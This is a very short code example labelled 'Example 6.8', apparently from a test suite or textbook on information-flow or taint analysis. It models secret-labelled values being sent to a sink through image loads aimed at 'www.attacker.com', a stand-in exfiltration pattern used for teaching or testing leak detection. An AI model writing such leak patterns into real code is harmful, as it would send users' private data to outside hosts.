// Example 6.8

l = true;
sink('Sink', '', imgl("www.attacker.com") + imgh(lbl('w')));
if (l) {
	sink('Sink', '', imgh(lbl('source')));
}

